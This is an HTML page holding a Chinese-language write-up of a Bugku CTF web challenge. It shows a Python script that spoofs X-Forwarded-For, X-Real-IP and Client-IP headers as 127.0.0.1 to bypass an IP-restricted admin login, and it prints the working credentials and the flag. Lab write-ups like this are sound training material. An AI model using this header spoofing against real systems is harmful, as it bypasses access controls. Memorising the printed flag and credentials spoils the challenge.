@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Bugku CTF】Web-本地管理员 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href=" ">← 返回首页</a ></p >
+    <h1>【Bugku CTF】Web-本地管理员 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.13 | <strong>分类：</strong>CTF | <strong>标签：</strong>Bugku, Web, 伪造IP, PHP</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Bugku CTF</li>
+        <li><strong>分类：</strong>Web</li>
+        <li><strong>题目名称：</strong>本地管理员</li>
+        <li><strong>描述：</strong>本地管理员</li>
+        <li><strong>提交格式：</strong>flag{}</li>
+    </ul>
+
+    <h2>2. 解题思路</h2>
+    <p>题目名称为“本地管理员”，暗示服务器存在 IP 访问限制，只允许 127.0.0.1 访问。页面为管理员登录系统，我们需要先找到账号密码，再伪造请求头绕过 IP 限制。</p >
+
+    <h2>3. 操作步骤</h2>
+    <ol>
+        <li>启动场景，出现管理员登录界面。</li>
+        <li>按 <code>F12</code> 查看源码，在底部发现被注释的 Base64 字符串：<code>&lt;!-- dGVzdDp0ZXN0 --&gt;</code>。</li>
+        <li>解码 Base64 得到疑似账号密码：<code>test:test</code>。</li>
+        <li>尝试直接输入账号密码登录，提示 <code>IP禁止访问，请联系本地管理员登陆，IP已被记录。</code></li>
+        <li>编写 Python 脚本，伪造 IP 请求头发送 POST 请求（基于表单源码，参数名为 <code>user</code> 和 <code>pass</code>）：</li>
+    </ol>
+    <pre><code>import requests
+import re
+
+url = "http://160.202.254.160:12412/"
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...',
+    'X-Forwarded-For': '127.0.0.1',
+    'X-Real-IP': '127.0.0.1',
+    'Client-IP': '127.0.0.1'
+}
+data = {'user': 'admin', 'pass': 'test123'}
+
+r = requests.post(url, headers=headers, data=data)
+r.encoding = 'utf-8'
+match = re.search(r'(flag|key)\{.*?\}', r.text, re.IGNORECASE)
+if match:
+    print(match.group(0))</code></pre>
+    <ol start="6">
+        <li>首次运行提示 <code>Invalid credentials!</code>。查阅评论区大佬提示，得知真实密码为 <code>admin:test123</code>。</li>
+        <li>修改账号密码重新运行，成功获取 Flag：<code>flag{8450679965a5b18985f2d8f64faa83ad}</code>。</li>
+    </ol>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>源码注释不一定是真的：</strong>源码注释里 Base64 解码出来是 <code>test:test</code>，但实际生效的登录凭证是 <code>admin:test123</code>。这告诉我们，在代码审计中注释里的内容往往只是烟雾弹，不能盲目相信，还是得结合报错信息和评论区情报去判断。</li>
+        <li><strong>伪造 IP 需要多请求头配合：</strong>由于不同的 Web 服务器和框架识别代理 IP 的字段不同，写脚本时同时带上 <code>X-Forwarded-For</code>、<code>X-Real-IP</code> 和 <code>Client-IP</code> 是最稳妥的做法。</li>
+        <li><strong>注意 HTML 表单的参数名：</strong>在写登录脚本时，千万别凭感觉写参数名。最好先看页面源码里的 <code>&lt;input name="..."&gt;</code> 属性，比如本题实际接收的参数是 <code>user</code> 和 <code>pass</code>，而不是 <code>username</code> 和 <code>password</code>。</li>
+        <li><strong>善用评论区：</strong>当你卡在密码验证或者无法出 flag 时，多去看平台的评论区。往往会有已经解出题目的师傅给出关键提示（比如直接告诉你真实账号密码），这是 CTF 实战中非常重要的“情报收集”能力。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
